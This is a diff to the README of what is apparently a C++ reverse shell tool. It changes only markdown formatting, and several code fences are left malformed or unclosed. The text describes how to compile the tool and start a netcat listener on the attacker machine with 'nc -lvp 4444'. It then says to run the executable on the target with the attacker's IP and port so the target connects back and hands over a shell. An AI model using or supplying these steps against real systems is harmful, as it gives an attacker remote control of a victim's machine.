@@ -21,35 +21,34 @@ A reverse shell is a type of shell where the target machine connects back to the
 Install Dependencies:
 Ensure you have a C++ compiler installed (like g++, clang, or MSVC). For example, on Ubuntu, you can install g++ with:
 
-bash
+```bash
 
 sudo apt-get install g++
-
 Compile the Code:
 
-bash
+```bash
 
 g++ -o reverse_shell reverse_shell.cpp
 
 For Windows, you might use:
 
-bash
+```bash
 
     cl /EHsc reverse_shell.cpp
 
-How to Use
+- How to Use
 
     Start a Listener on the Attacker Machine:
     You can use netcat to start a listener. For example:
 
-    bash
+    ``` bash
 
 nc -lvp 4444
 
 Run the Reverse Shell on the Target Machine:
 Ensure the target machine can reach the attacker's IP and port. Run the compiled reverse_shell executable:
 
-bash
+```bash
 
 ./reverse_shell <attacker_ip> <port>
 
